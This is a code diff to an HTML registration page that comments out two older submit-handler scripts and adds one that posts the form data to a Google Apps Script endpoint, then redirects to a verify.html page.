@@ -286,7 +286,7 @@
       <button class="register-btn" id="submitBtn" type="submit">Submit</button>
     </form>
   </div>
-    <script>
+   <script>/*
     const form = document.getElementById('myForm');
     const submitBtn = document.getElementById('submitBtn');
 
@@ -303,9 +303,9 @@
        
         form.submit(); // Now submit to nextpage.html
       }, 2000);
-    });
+    });*/
   </script>
-<script>
+<script>/*
  document.getElementById('myForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
@@ -327,7 +327,7 @@
       alert("Error sending form. Please try again.");
       console.error(error);
     });
-  });
+  });*/
 </script>
   <script>
     const lgas = {
@@ -387,5 +387,44 @@
       }
     }
   </script>
+ <script>
+  const form = document.getElementById('myForm');
+  const submitBtn = document.getElementById('submitBtn');
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault(); // Prevent default form submission
+
+    // Disable button, show processing feedback
+    submitBtn.disabled = true;
+    submitBtn.classList.add('blinking');
+    submitBtn.textContent = 'Processing...';
+
+    const formData = new FormData(form);
+
+    // Send data using fetch
+    fetch('https://script.google.com/macros/s/AKfycbzXbPLc2fCdeoOnLCv9qzI5I_tQqcKJscYcABiVOFVEaS5nD4eaEYvqO-I7NCE4e07t/exec', {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => response.text())
+    .then(result => {
+      console.log("Server response:", result);
+      // Optional: show success
+      // alert("Submitted");
+
+      // ✅ Wait 2 seconds, then redirect
+      setTimeout(() => {
+        window.location.href = "verify.html";
+      }, 2000);
+    })
+    .catch(error => {
+      alert("Error sending form. Please try again.");
+      console.error(error);
+      submitBtn.disabled = false;
+      submitBtn.classList.remove('blinking');
+      submitBtn.textContent = 'Submit';
+    });
+  });
+</script>
 </body>
 </html>
